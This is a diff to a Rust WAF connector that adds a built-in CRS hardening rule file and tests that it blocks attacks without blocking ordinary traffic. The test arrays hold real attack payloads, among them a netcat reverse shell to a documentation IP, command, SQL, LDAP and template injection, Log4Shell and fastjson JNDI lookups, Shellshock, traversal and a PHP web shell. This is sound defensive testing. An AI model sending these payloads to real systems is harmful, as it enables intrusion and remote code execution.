@@ -67,8 +67,16 @@ const RECOMMENDED_CONF_NAME: &str = "@recommended-conf";
 /// derived file's header.
 const RECOMMENDED_CONF: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/recommended.conf"));
 
+/// The name `Include` resolves to the built-in CRS hardening supplement, in every build.
+///
+/// Include it after the CRS rules: it retargets rules that are already defined and adds `deny`
+/// rules, and the CRS gives its own verdict first. Like every built-in `@` file it loads only
+/// through an `Include` that names it, never through a wildcard.
+const CRS_HARDENING_CONF_NAME: &str = "@crs-hardening-conf";
+
 /// Adds the built-in files that the configuration does not override: the
-/// recommended baseline in every build and, with `embed-crs`, the CRS tree.
+/// recommended baseline and the CRS hardening supplement in every build and, with `embed-crs`,
+/// the CRS tree.
 ///
 /// Every file goes through the same name and size checks as a configured
 /// `rule_data` entry, so the built-in set cannot exceed the documented bounds.
@@ -79,7 +87,11 @@ fn builtin_rule_data(rule_data: &mut BTreeMap<String, Vec<u8>>) -> Result<Vec<St
     let mut configured: std::collections::BTreeSet<String> =
         rule_data.keys().map(|name| normalize_rule_data_name(name)).collect();
     let mut unlisted = Vec::new();
-    let builtins = std::iter::once((RECOMMENDED_CONF_NAME, RECOMMENDED_CONF));
+    let builtins = [
+        (RECOMMENDED_CONF_NAME, RECOMMENDED_CONF),
+        (CRS_HARDENING_CONF_NAME, coraza::seclang::CRS_HARDENING_CONF.as_bytes()),
+    ]
+    .into_iter();
     #[cfg(feature = "embed-crs")]
     let builtins = builtins.chain(embedded_crs::EMBEDDED_CRS.iter().copied());
     for (name, bytes) in builtins {
@@ -837,6 +849,1171 @@ fn check_limits(config: &Config, limits: CompileLimits) -> Result<(), CompileErr
         });
     }
     Ok(())
+}
+
+/// Tests of the built-in `@crs-hardening-conf` supplement.
+#[cfg(test)]
+#[expect(clippy::unwrap_used, reason = "The supplement tests use fixed valid fixtures.")]
+#[cfg_attr(
+    feature = "embed-crs",
+    expect(
+        clippy::indexing_slicing,
+        reason = "The gate test reads fields of a fixed JSON fixture."
+    )
+)]
+mod crs_hardening_tests {
+    use std::{
+        collections::{BTreeMap, BTreeSet},
+        path::PathBuf,
+    };
+
+    use coraza::rule_data::{Memory, RuleData as _};
+
+    use super::{
+        builtin_rule_data, CountingRuleData, Generation, COMPILE_LIMITS, CRS_HARDENING_CONF_NAME, RECOMMENDED_CONF_NAME,
+    };
+    use crate::config::Config;
+
+    /// Compiles a policy document.
+    fn generation(json: &str) -> Generation {
+        Generation::compile(Config::parse(json.as_bytes()).unwrap()).unwrap()
+    }
+
+    /// A one-policy document whose directives are `directives`.
+    fn document(directives: &[&str]) -> String {
+        serde_json::json!({"directives_map": {"p": directives}, "default_directives": "p"}).to_string()
+    }
+
+    /// One request through the default policy: the rule and status that interrupt it, if any.
+    fn run(
+        generation: &Generation,
+        method: &str,
+        uri: &str,
+        headers: &[(String, String)],
+        body: &[u8],
+    ) -> Option<(i32, u16)> {
+        run_detailed(generation, method, uri, headers, body).0
+    }
+
+    /// Like [`run`], and the ids of the CRS attack rules (930000 to 949999) that matched the request.
+    fn run_detailed(
+        generation: &Generation,
+        method: &str,
+        uri: &str,
+        headers: &[(String, String)],
+        body: &[u8],
+    ) -> (Option<(i32, u16)>, BTreeSet<i32>) {
+        let policy = generation.select("example.com").unwrap();
+        let mut transaction = policy.waf.new_transaction();
+        transaction.set_remote_addr("203.0.113.7");
+        transaction.set_remote_port(50000);
+        transaction.set_server_addr("192.0.2.10");
+        transaction.set_server_port(8080);
+        transaction.process_uri(uri, method, "HTTP/1.1");
+        // The connector hands the engine every header Envoy has: the pseudo-headers, which the engine puts in
+        // REQUEST_HEADERS (`:path` holds the whole URI, query string included), and the two the connection manager
+        // adds.
+        let host = headers.iter().find(|(name, _)| name.eq_ignore_ascii_case("host"));
+        if let Some((_, host)) = host {
+            transaction.add_request_header(":authority", host);
+        }
+        transaction.add_request_header(":path", uri);
+        transaction.add_request_header(":method", method);
+        transaction.add_request_header(":scheme", "http");
+        transaction.add_request_header("x-forwarded-proto", "http");
+        transaction.add_request_header("x-request-id", "5b1b2c4e-6a0f-4a3b-9d55-0b6a8f3f7c21");
+        for (name, value) in headers {
+            transaction.add_request_header(name, value);
+        }
+        if let Some((_, host)) = host {
+            transaction.set_server_name(host);
+        }
+        let interruption = transaction
+            .process_request_headers()
+            .or_else(|| transaction.process_request_body(body));
+        let matched = transaction
+            .matched_rules()
+            .iter()
+            .map(coraza::audit_log::MatchedRule::rule_id)
+            .filter(|id| (930_000..950_000).contains(id))
+            .collect();
+        // Rule id 0 is the engine's refusal of a multipart file upload (413), not the verdict of a rule.
+        let verdict = interruption
+            .filter(|interruption| interruption.rule_id != 0)
+            .map(|interruption| (interruption.rule_id, interruption.status));
+        (verdict, matched)
+    }
+
+    /// The default browser-like headers of the hand-written cases.
+    fn headers(extra: &[(&str, &str)]) -> Vec<(String, String)> {
+        [
+            ("Host", "example.com"),
+            ("User-Agent", "Mozilla/5.0 Firefox/128.0"),
+            ("Accept", "*/*"),
+        ]
+        .iter()
+        .chain(extra)
+        .map(|(name, value)| ((*name).to_owned(), (*value).to_owned()))
+        .collect()
+    }
+
+    /// The JDK gadget class and the serialization stream that rules 10944130 and 10944210 deny.
+    const GADGET: &str = "com.sun.rowset.JdbcRowSetImpl";
+
+    #[test]
+    fn include_resolves_the_built_in_supplement_in_every_build() {
+        // No CRS: the deny rules work alone, in the connector's multiphase mode.
+        let generation = generation(&document(&["SecRuleEngine On", "Include @crs-hardening-conf"]));
+        let uri = format!("/?x={GADGET}");
+        assert_eq!(
+            run(&generation, "GET", &uri, &headers(&[]), b""),
+            Some((10_944_130, 403)),
+            "the gadget class is denied"
+        );
+        assert_eq!(
+            run(&generation, "GET", "/?x=hello", &headers(&[]), b""),
+            None,
+            "a plain request passes"
+        );
+        let body = br#"{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://203.0.113.9:1389/Exploit"}"#;
+        let json = headers(&[("Content-Type", "application/json")]);
+        assert_eq!(
+            run(&generation, "POST", "/api", &json, body),
+            None,
+            "without the baseline no rule selects the JSON body processor, so the body is not parsed"
+        );
+        let with_baseline = self::generation(&document(&[
+            "Include @recommended-conf",
+            "SecRuleEngine On",
+            "Include @crs-hardening-conf",
+        ]));
+        assert_eq!(
+            run(&with_baseline, "POST", "/api", &json, body),
+            Some((10_944_130, 403)),
+            "the fastjson body is denied once the JSON body processor is selected"
+        );
+    }
+
+    #[test]
+    fn wildcards_leave_out_the_supplement_but_its_exact_name_reads() {
+        let source = |name: &str| {
+            let mut rule_data = BTreeMap::from([(name.to_owned(), b"SecRuleEngine On".to_vec())]);
+            let unlisted = builtin_rule_data(&mut rule_data).unwrap();
+            CountingRuleData::new(Memory::new(rule_data), unlisted, COMPILE_LIMITS.rule_data_read_bytes)
+        };
+        let supplement = PathBuf::from(CRS_HARDENING_CONF_NAME);
+        let built_in = source("rules.conf");
+        for pattern in ["*", "**/*", "@*", "*conf", "@crs-*"] {
+            let matches = built_in.glob(pattern).unwrap();
+            assert!(!matches.contains(&supplement), "{pattern} matched {matches:?}");
+        }
+        assert_eq!(
+            built_in.read(&supplement).unwrap(),
+            coraza::seclang::CRS_HARDENING_CONF.as_bytes(),
+            "the exact name reads the engine's file"
+        );
+        assert!(
+            built_in.read(&PathBuf::from(RECOMMENDED_CONF_NAME)).is_ok(),
+            "the baseline stays readable beside it"
+        );
+        // A configured replacement is not built in, so globs list it like any other entry.
+        assert_eq!(source(CRS_HARDENING_CONF_NAME).glob("@*").unwrap(), [supplement]);
+
+        // A wildcard include loads the configured file only: the gadget passes. With `embed-crs` a bare `*` also
+        // matches the embedded `crs/` directory, which an `Include` cannot read, so that build uses `*conf`.
+        let mut patterns = vec!["*conf", "**/*conf"];
+        if cfg!(not(feature = "embed-crs")) {
+            patterns.push("*");
+        }
+        for pattern in patterns {
+            let generation = generation(
+                &serde_json::json!({
+                    "directives_map": {"p": ["SecRuleEngine On", format!("Include {pattern}")]},
+                    "default_directives": "p",
+                    "rule_data": {"rules.conf": "SecRule ARGS \"@streq never\" \"id:1,phase:2,deny\""}
+                })
+                .to_string(),
+            );
+            assert_eq!(
+                run(&generation, "GET", &format!("/?x={GADGET}"), &headers(&[]), b""),
+                None,
+                "Include {pattern} does not load the supplement"
+            );
+        }
+        // `@*` names only `@` files, which no wildcard lists, so nothing matches.
+        let error =
+            Generation::compile(Config::parse(document(&["SecRuleEngine On", "Include @*"]).as_bytes()).unwrap())
+                .unwrap_err()
+                .to_string();
+        assert!(error.contains("matched no files"), "message was {error:?}");
+    }
+
+    #[test]
+    fn a_configured_entry_replaces_the_built_in_supplement() {
+        let generation = generation(
+            r#"{
+                "directives_map": {"p": ["SecRuleEngine On", "Include @crs-hardening-conf"]},
+                "default_directives": "p",
+                "rule_data": {"@crs-hardening-conf": "SecRule ARGS \"@streq never\" \"id:1,phase:2,deny\""}
+            }"#,
+        );
+        assert_eq!(
+            run(&generation, "GET", &format!("/?x={GADGET}"), &headers(&[]), b""),
+            None,
+            "the configured file is the one that loads"
+        );
+    }
+
+    /// The README's CRS policy with the supplement included last, and without it.
+    #[cfg(feature = "embed-crs")]
+    fn crs_policy(supplement: bool) -> Generation {
+        crs_policy_at(supplement, None)
+    }
+
+    /// Like [`crs_policy`], with the CRS blocking and detecting at the paranoia levels `levels` (blocking, detection);
+    /// `None` leaves the CRS default, level 1.
+    #[cfg(feature = "embed-crs")]
+    fn crs_policy_at(supplement: bool, levels: Option<(u8, u8)>) -> Generation {
+        let levels = levels.map(|(blocking, detection)| {
+            format!(
+                "SecAction \"id:900000,phase:1,pass,t:none,nolog,setvar:tx.blocking_paranoia_level={blocking},\
+                 setvar:tx.detection_paranoia_level={detection}\""
+            )
+        });
+        let mut directives = vec!["Include @recommended-conf", "SecRuleEngine On"];
+        directives.extend(levels.as_deref());
+        directives.extend(["Include crs/crs-setup.conf", "Include crs/rules/*.conf"]);
+        if supplement {
+            directives.push("Include @crs-hardening-conf");
+        }
+        generation(&document(&directives))
+    }
+
+    /// `x2_02`: command, SQL, template and `NoSQL` payloads in a custom header block at paranoia level 1 with the
+    /// supplement.
+    #[cfg(feature = "embed-crs")]
+    #[test]
+    fn x2_02_custom_header_payloads_must_block() {
+        let hardened = crs_policy(true);
+        let crs_only = crs_policy(false);
+        let mut missed = Vec::new();
+        for value in [
+            "$(id)",
+            "x | nc -e /bin/sh 203.0.113.9 4444",
+            "1' OR '1'='1",
+            "{{config.__class__.__init__}}",
+            "{\"$where\":\"sleep(5000)\"}",
+            ";cat /etc/passwd",
+            "*)(uid=*))(|(uid=*",
+            "http://203.0.113.9/shell.txt?",
+        ] {
+            let request = headers(&[("X-Tenant-Filter", value)]);
+            if run(&hardened, "GET", "/app", &request, b"").is_none() {
+                missed.push(value);
+            }
+            assert_eq!(
+                run(&crs_only, "GET", "/app", &request, b"").map(|(rule, _)| rule),
+                None,
+                "the CRS alone passes {value:?} in a custom header"
+            );
+        }
+        assert!(missed.is_empty(), "passed in X-Tenant-Filter: {missed:?}");
+    }
+
+    /// `x2_02` backstop: the families the CRS already reads in every header still block, with and without the
+    /// supplement.
+    #[cfg(feature = "embed-crs")]
+    #[test]
+    fn x2_02_backstop_some_families_cover_all_headers() {
+        for generation in [crs_policy(false), crs_policy(true)] {
+            for value in [
+                "../../../../etc/shadow",
+                "<img src=x onerror=alert(1)>",
+                "<?php system($_GET[c]); ?>",
+                "() { :; }; /bin/id",
+            ] {
+                assert!(
+                    run(&generation, "GET", "/app", &headers(&[("X-Tenant-Filter", value)]), b"").is_some(),
+                    "{value}"
+                );
+            }
+        }
+    }
+
+    /// `x2_03`: the fastjson `JdbcRowSetImpl` exploit passes the CRS at level 1 and is denied with the supplement.
+    #[cfg(feature = "embed-crs")]
+    #[test]
+    fn x2_03_fastjson_rowset_exploit_must_block_at_pl1() {
+        let body = br#"{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://203.0.113.9:1389/Exploit","autoCommit":true}"#;
+        let json = headers(&[("Content-Type", "application/json")]);
+        assert_eq!(
+            run(&crs_policy(false), "POST", "/api", &json, body),
+            None,
+            "the CRS alone passes the exploit at level 1"
+        );
+        assert_eq!(
+            run(&crs_policy(true), "POST", "/api", &json, body),
+            Some((10_944_130, 403)),
+            "the supplement denies it by rule 10944130"
+        );
+    }
+
+    /// `x2_03` backstop: the JDK-internal `TemplatesImpl` and the `Spring4Shell` chain hit CRS 944130 without the
+    /// supplement.
+    #[cfg(feature = "embed-crs")]
+    #[test]
+    fn x2_03_backstop_jdk_templates_and_classloader_hit_944130() {
+        for value in [
+            "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
+            "class.module.classLoader.resources",
+        ] {
+            assert!(
+                run(
+                    &crs_policy(false),
+                    "GET",
+                    &format!("/app?data={value}"),
+                    &headers(&[]),
+                    b""
+                )
+                .is_some(),
+                "{value}"
+            );
+        }
+    }
+
+    /// Included before the CRS, the file still denies the Java cases (its rules are `deny`, not scoring) and the header
+    /// payloads then pass: the retargeting needs the CRS rules to exist.
+    #[cfg(feature = "embed-crs")]
+    #[test]
+    fn placed_before_the_crs_the_deny_rules_still_work_and_the_retargeting_does_nothing() {
+        let before = generation(&document(&[
+            "Include @recommended-conf",
+            "SecRuleEngine On",
+            "Include @crs-hardening-conf",
+            "Include crs/crs-setup.conf",
+            "Include crs/rules/*.conf",
+        ]));
+        let body = br#"{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://203.0.113.9:1389/Exploit"}"#;
+        let json = headers(&[("Content-Type", "application/json")]);
+        assert_eq!(
+            run(&before, "POST", "/api", &json, body),
+            Some((10_944_130, 403)),
+            "the Java gadget is denied"
+        );
+        assert_eq!(
+            run(
+                &before,
+                "GET",
+                "/app?data=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA",
+                &headers(&[]),
+                b""
+            ),
+            Some((10_944_210, 403)),
+            "the serialized object is denied"
+        );
+        assert_eq!(
+            run(&before, "GET", "/app", &headers(&[("X-Tenant-Filter", "$(id)")]), b""),
+            None,
+            "the header payload passes: the retargeting ran before the rules existed"
+        );
+    }
+
+    /// The verdict of one gate entry.
+    #[cfg(feature = "embed-crs")]
+    fn verdict(outcome: Option<(i32, u16)>) -> &'static str {
+        if outcome.is_some() {
+            "block"
+        } else {
+            "pass"
+        }
+    }
+
+    /// The gate fixture.
+    #[cfg(feature = "embed-crs")]
+    fn gate() -> serde_json::Value {
+        serde_json::from_str(include_str!("../testdata/crs-hardening-gate.json")).unwrap()
+    }
+
+    /// One gate entry through `generation`.
+    #[cfg(feature = "embed-crs")]
+    fn run_gate_entry(generation: &Generation, entry: &serde_json::Value) -> Option<(i32, u16)> {
+        let request_headers: Vec<(String, String)> = entry["headers"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .map(|pair| {
+                (
+                    pair[0].as_str().unwrap().to_owned(),
+                    pair[1].as_str().unwrap().to_owned(),
+                )
+            })
+            .collect();
+        run(
+            generation,
+            entry["method"].as_str().unwrap(),
+            entry["uri"].as_str().unwrap(),
+            &request_headers,
+            entry["body"].as_str().unwrap_or("").as_bytes(),
+        )
+    }
+
+    /// The false-positive and detection gate: every recorded verdict with and without the supplement.
+    #[cfg(feature = "embed-crs")]
+    #[test]
+    fn the_gate_records_every_verdict_with_and_without_the_supplement() {
+        let fixture = gate();
+        let entries = fixture["requests"].as_array().unwrap();
+        let (hardened, crs_only) = (crs_policy(true), crs_policy(false));
+        let mut blocked: BTreeMap<String, Vec<String>> = BTreeMap::new();
+        let mut totals: BTreeMap<String, usize> = BTreeMap::new();
+        let mut mismatches = Vec::new();
+        for entry in entries {
+            let id = entry["id"].as_str().unwrap();
+            let group = entry["group"].as_str().unwrap().to_owned();
+            let with = run_gate_entry(&hardened, entry);
+            let without = run_gate_entry(&crs_only, entry);
+            *totals.entry(group.clone()).or_default() += 1;
+            if with.is_some() {
+                blocked.entry(group.clone()).or_default().push(id.to_owned());
+            }
+            for (name, got, want) in [
+                ("expect", verdict(with), entry["expect"].as_str().unwrap()),
+                ("crs_only", verdict(without), entry["crs_only"].as_str().unwrap()),
+            ] {
+                if got != want {
+                    mismatches.push(format!(
+                        "{id}: {name} is {want}, measured {got} (with the file: {with:?})"
+                    ));
+                }
+            }
+            if let Some(rule) = entry["rule"].as_i64() {
+                if with.map(|(rule, _)| i64::from(rule)) != Some(rule) {
+                    mismatches.push(format!("{id}: rule {rule} must interrupt, measured {with:?}"));
+                }
+            }
+        }
+        assert!(mismatches.is_empty(), "gate mismatches:\n{}", mismatches.join("\n"));
+
+        // The counts the README quotes. The supplement adds no block to an ordinary group of the gate: what blocks here
+        // is what the CRS alone blocks (a `crs_only` verdict is asserted above for every entry).
+        let count = |group: &str| blocked.get(group).map_or(0, Vec::len);
+        let total = |group: &str| totals.get(group).copied().unwrap_or(0);
+        for (group, requests, blocks) in [
+            ("benign", 84, 6),
+            ("plain", 8, 0),
+            ("header-set", 22, 0),
+            ("user-agent", 35, 0),
+            ("header-zoo", 21, 0),
+            ("ordinary", 37, 1),
+            ("encoded-benign", 20, 0),
+            ("real-user-agent", 163, 0),
+            ("real-header-set", 116, 10),
+            ("page-url", 79, 0),
+            ("type-key", 9, 0),
+            ("cookie-set", 33, 0),
+            ("password", 14, 0),
+            ("old-client", 16, 0),
+            ("upload", 10, 0),
+            ("header-class", 7, 0),
+            ("encoded-value", 16, 0),
+        ] {
+            assert_eq!(total(group), requests, "the {group} group has {requests} requests");
+            assert_eq!(
+                count(group),
+                blocks,
+                "{group}: the CRS alone blocks {blocks}, and so does the file"
+            );
+        }
+        // The groups of attacks and documented false positives: 17 payloads in 4 places (the cookie that the parser
+        // splits at `;` passes), payloads in headers that CRS rules already read, 18 Java cases, commands in the
+        // User-Agent, false positives the file blocks and the CRS alone passes (each in the README with its tuning),
+        // payloads in headers named after a path, a URL or an encoding, angle-bracket payloads that rule 941100 does
+        // not read, and a command in a path segment.
+        for (group, requests, blocks) in [
+            ("header-matrix", 68, 67),
+            ("native-header", 39, 39),
+            ("java", 18, 18),
+            ("ua-command", 9, 9),
+            ("known-false-positive", 18, 18),
+            ("sink-header", 10, 10),
+            ("raw-header-xss", 4, 4),
+            ("residue", 1, 0),
+        ] {
+            assert_eq!(total(group), requests, "the {group} group has {requests} requests");
+            assert_eq!(count(group), blocks, "{group} blocks {blocks} with the file");
+        }
+    }
+
+    /// The supplement adds no block to the benign groups of the gate at any paranoia level: whatever it blocks of
+    /// them, the CRS alone blocks too. (The CRS itself blocks many of them above level 1.) The groups are a sample:
+    /// each review round found a class of ordinary traffic they lacked, and the gate holds it now.
+    #[cfg(feature = "embed-crs")]
+    #[test]
+    fn the_supplement_adds_no_benign_block_at_any_paranoia_level() {
+        let fixture = gate();
+        let benign_groups: BTreeSet<&str> = fixture["benign_groups"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .map(|group| group.as_str().unwrap())
+            .collect();
+        let benign: Vec<&serde_json::Value> = fixture["requests"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .filter(|entry| benign_groups.contains(entry["group"].as_str().unwrap()))
+            .collect();
+        assert_eq!(
+            benign.len(),
+            84 + 8 + 22 + 35 + 21 + 37 + 20 + 163 + 116 + 79 + 9 + 33 + 14 + 16 + 10 + 7 + 16,
+            "the benign groups"
+        );
+        for level in 1..=4 {
+            let levels = Some((level, level));
+            let (hardened, crs_only) = (crs_policy_at(true, levels), crs_policy_at(false, levels));
+            let added: Vec<&str> = benign
+                .iter()
+                .filter(|entry| {
+                    run_gate_entry(&hardened, entry).is_some() && run_gate_entry(&crs_only, entry).is_none()
+                })
+                .map(|entry| entry["id"].as_str().unwrap())
+                .collect();
+            assert!(
+                added.is_empty(),
+                "at paranoia level {level} the supplement newly blocks {added:?}"
+            );
+        }
+    }
+
+    /// `native-header`: a payload in a header that a CRS rule already reads keeps matching the same CRS rules with the
+    /// supplement. The supplement must not take `Accept`, `Accept-Encoding`, `Accept-Language`, `Host`, `Content-Type`,
+    /// `Content-Length`, `x-request-id` or `x-forwarded-proto` away from rules that read every header, such as the
+    /// `Log4Shell`, Shellshock, traversal and Java rules; a protocol rule that blocks the same request by chance does
+    /// not make up for it.
+    #[cfg(feature = "embed-crs")]
+    #[test]
+    fn a_payload_in_a_header_the_supplement_excludes_still_matches_the_crs_rules() {
+        let (hardened, crs_only) = (crs_policy(true), crs_policy(false));
+        let payloads = [
+            ("Log4Shell", "${jndi:ldap://203.0.113.9:1389/a}", 944_150),
+            ("Shellshock", "() { :; }; /bin/cat /etc/passwd", 932_170),
+            ("path traversal", "../../../../etc/passwd", 930_100),
+            ("Java runtime", "java.lang.Runtime.getRuntime().exec('id')", 944_130),
+        ];
+        let excluded = [
+            "Accept",
+            "Accept-Encoding",
+            "Accept-Language",
+            "Content-Type",
+            "Content-Length",
+            "Host",
+            "x-request-id",
+            "x-forwarded-proto",
+            // Headers that some rules do not read, by name or by pattern: the rules that read every header still do.
+            "HX-Current-URL",
+            "X-Auth-Request-Redirect",
+            "X-Forwarded-Path",
+            "Fastly-Orig-Accept-Encoding",
+            "Prefer",
+            "Forwarded",
+        ];
+        for (name, payload, rule) in payloads {
+            for header in excluded.into_iter().chain(["User-Agent", "X-Custom-Data"]) {
+                let request: Vec<(String, String)> = headers(&[])
+                    .into_iter()
+                    .filter(|(existing, _)| !existing.eq_ignore_ascii_case(header))
+                    .chain([(header.to_owned(), payload.to_owned())])
+                    .collect();
+                let (with, with_rules) = run_detailed(&hardened, "GET", "/app", &request, b"");
+                let (without, without_rules) = run_detailed(&crs_only, "GET", "/app", &request, b"");
+                assert!(
+                    without_rules.contains(&rule),
+                    "{name} in {header}: the CRS alone matches rule {rule}, got {without_rules:?}"
+                );
+                assert!(
+                    with_rules.is_superset(&without_rules),
+                    "{name} in {header}: the supplement loses {:?}",
+                    without_rules.difference(&with_rules).collect::<Vec<_>>()
+                );
+                assert!(with.is_some() && without.is_some(), "{name} in {header} blocks");
+            }
+        }
+    }
+
+    /// Rule 10932238 is a `deny` rule: it must follow the level the CRS blocks at, not the level it only detects at.
+    #[cfg(feature = "embed-crs")]
+    #[test]
+    fn a_code_span_is_denied_by_the_supplement_at_the_blocking_level_only() {
+        let uri = "/c?comment=join%20on%20the%20%60id%60%20column";
+        for (blocking, detection, denied) in [(1, 1, false), (1, 3, false), (2, 4, false), (3, 3, true), (4, 4, true)] {
+            let levels = Some((blocking, detection));
+            let (with, _) = run_detailed(&crs_policy_at(true, levels), "GET", uri, &headers(&[]), b"");
+            let (without, _) = run_detailed(&crs_policy_at(false, levels), "GET", uri, &headers(&[]), b"");
+            assert_eq!(
+                with.map(|(rule, _)| rule),
+                if denied {
+                    Some(10_932_238)
+                } else {
+                    without.map(|(rule, _)| rule)
+                },
+                "blocking level {blocking}, detection level {detection}"
+            );
+        }
+    }
+
+    /// The README's CRS policy with the supplement, `before` the CRS rules and `after` the supplement.
+    #[cfg(feature = "embed-crs")]
+    fn tuned_crs_policy(before: &[&str], after: &[&str]) -> Generation {
+        let mut directives = vec!["Include @recommended-conf", "SecRuleEngine On"];
+        directives.extend(before);
+        directives.extend([
+            "Include crs/crs-setup.conf",
+            "Include crs/rules/*.conf",
+            "Include @crs-hardening-conf",
+        ]);
+        directives.extend(after);
+        generation(&document(&directives))
+    }
+
+    /// A documented false positive: its name, the headers that cause it, the directives of its tuning before the CRS
+    /// rules and after the supplement.
+    #[cfg(feature = "embed-crs")]
+    type TuningCase<'a> = (&'a str, Vec<(&'a str, &'a str)>, &'a [&'a str], &'a [&'a str]);
+
+    /// The false positives that the README documents, each with the tuning it gives.
+    #[cfg(feature = "embed-crs")]
+    fn documented_false_positives() -> [TuningCase<'static>; 12] {
+        const SNAPCHAT: &str = "Snapchat/12.70.0.35 (iPhone15,2; iOS 17.2; gzip)";
+        // A header or a cookie that holds a URL with an IP address as host (931100), after the supplement.
+        // The field mask of Flask-RESTX (932280), after the supplement.
+        // The User-Agent of Ansible (932260), after the supplement.
+        // A User-Agent that ends in `; gzip)` is read by 932260 and by 10932235: a rule before the CRS removes both for
+        // it.
+        const CTL: &str = "SecRule REQUEST_HEADERS:User-Agent \"@rx ^Snapchat/\" \"id:1001,phase:1,pass,nolog,t:none,\
+                   ctl:ruleRemoveTargetById=932260;REQUEST_HEADERS:User-Agent,ctl:ruleRemoveById=10932235\"";
+        [
+            (
+                "ce-source",
+                vec![("ce-source", "https://10.96.0.1:443")],
+                &[],
+                &["SecRuleUpdateTargetById 931100 \"!REQUEST_HEADERS:ce-source\""],
+            ),
+            // An intranet header that holds a URL, under a name that is not in the list of page-URL headers.
+            (
+                "X-Callback-Url",
+                vec![("X-Callback-Url", "http://10.0.0.5:8080/hook")],
+                &[],
+                &["SecRuleUpdateTargetById 931100 \"!REQUEST_HEADERS:X-Callback-Url\""],
+            ),
+            // An IPv6 host and a path with brackets in a page-URL header: rule 932130 reads them as a shell glob.
+            (
+                "X-Original-URL",
+                vec![("X-Original-URL", "https://[2001:db8::10]:8443/app/")],
+                &[],
+                &["SecRuleUpdateTargetById 932130 \"!REQUEST_HEADERS:X-Original-URL\""],
+            ),
+            (
+                "x-matched-path",
+                vec![("x-matched-path", "/products/[slug]")],
+                &[],
+                &["SecRuleUpdateTargetById 932130 \"!REQUEST_HEADERS:x-matched-path\""],
+            ),
+            // The AWSALB cookie of an AWS load balancer: 108 to 192 random bytes of base64, 0.24 percent of which
+            // decode to bytes that libinjection reads as a tag. This value is from the review's corpus (seed 77).
+            (
+                "AWSALB cookie",
+                vec![(
+                    "Cookie",
+                    "AWSALB=cay6nrU6pE1StwPCQkSQ0sYXX/G/cTm3n+XomtZKhB7LPCV/qFBzoSeTrT3ZSRHVKJP30WDGKqj29LeLEazFAhibTQ2la7EyW1Pl9WCw1Y4lEMSzWKyCmzNHHgKW1VW+wDPh121sUHUcSSV/Og==",
+                )],
+                &[],
+                &["SecRuleUpdateTargetById 10941104 \"!REQUEST_COOKIES:AWSALB\""],
+            ),
+            (
+                "Destination",
+                vec![("Destination", "http://192.168.1.50:5005/dav/report-copy.txt")],
+                &[],
+                &["SecRuleUpdateTargetById 931100 \"!REQUEST_HEADERS:Destination\""],
+            ),
+            (
+                "X-Gitlab-Instance",
+                vec![("X-Gitlab-Instance", "http://192.168.10.20")],
+                &[],
+                &["SecRuleUpdateTargetById 931100 \"!REQUEST_HEADERS:X-Gitlab-Instance\""],
+            ),
+            (
+                "callback-url cookie",
+                vec![(
+                    "Cookie",
+                    "next-auth.callback-url=http%3A%2F%2F127.0.0.1%3A3000%2Fdashboard",
+                )],
+                &[],
+                &["SecRuleUpdateTargetById 931100 \"!REQUEST_COOKIES:next-auth.callback-url\""],
+            ),
+            (
+                "X-Fields",
+                vec![("X-Fields", "{id,name}")],
+                &[],
+                &["SecRuleUpdateTargetById 932280 \"!REQUEST_HEADERS:X-Fields\""],
+            ),
+            (
+                "ansible-httpget",
+                vec![("User-Agent", "ansible-httpget")],
+                &[],
+                &["SecRuleUpdateTargetById 932260 \"!REQUEST_HEADERS:User-Agent\""],
+            ),
+            ("Snapchat", vec![("User-Agent", SNAPCHAT)], &[CTL], &[]),
+            // A header that carries the page URL under a name the file does not list (nginx
+            // `proxy_set_header X-Request-URI $request_uri`).
+            (
+                "X-Request-URI",
+                vec![("X-Request-URI", "/search?q=ruby+on+rails+jobs")],
+                &[],
+                &["SecRuleUpdateTargetById 930120 931100 932120 932160 932235 \"!REQUEST_HEADERS:X-Request-URI\""],
+            ),
+        ]
+    }
+
+    /// Each false positive that the README documents blocks with the supplement, passes the CRS alone, and passes after
+    /// the tuning the README gives for it.
+    #[cfg(feature = "embed-crs")]
+    #[test]
+    fn the_tuning_the_readme_gives_clears_each_documented_false_positive() {
+        let cases = documented_false_positives();
+        let crs_only = crs_policy(false);
+        for (name, extra, before, after) in cases {
+            let request: Vec<(String, String)> = headers(&[])
+                .into_iter()
+                .filter(|(existing, _)| !extra.iter().any(|(header, _)| existing.eq_ignore_ascii_case(header)))
+                .chain(
+                    extra
+                        .iter()
+                        .map(|(header, value)| ((*header).to_owned(), (*value).to_owned())),
+                )
+                .collect();
+            assert!(
+                run(&crs_only, "GET", "/", &request, b"").is_none(),
+                "{name}: the CRS alone passes it"
+            );
+            assert!(
+                run(&crs_policy(true), "GET", "/", &request, b"").is_some(),
+                "{name}: the supplement blocks it"
+            );
+            assert!(
+                run(&tuned_crs_policy(before, after), "GET", "/", &request, b"").is_none(),
+                "{name}: the tuning of the README clears it"
+            );
+        }
+    }
+
+    /// Base64 of ordinary markup in a JSON field (an SVG icon, an HTML snippet with an inline style, the `raw` message
+    /// of the Gmail API) is read by rule 10941100 like the markup itself would be. The README gives the tuning, which
+    /// removes the field from the rule: the CRS alone passes the value, the supplement blocks it, the tuning clears it.
+    #[cfg(feature = "embed-crs")]
+    #[test]
+    fn the_tuning_the_readme_gives_clears_a_base64_markup_field() {
+        let json = headers(&[("Content-Type", "application/json")]);
+        let (hardened, crs_only) = (crs_policy(true), crs_policy(false));
+        for (name, body, field) in [
+            (
+                "SVG icon",
+                r#"{"name":"Inbox","icon":"PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgaGVpZ2h0PSIxNiI+PHJlY3Qgd2lkdGg9IjE2IiBoZWlnaHQ9IjE2IiByeD0iMyIgZmlsbD0iIzRmNDZlNSIvPjwvc3ZnPg=="}"#,
+                "json.icon",
+            ),
+            (
+                "HTML snippet",
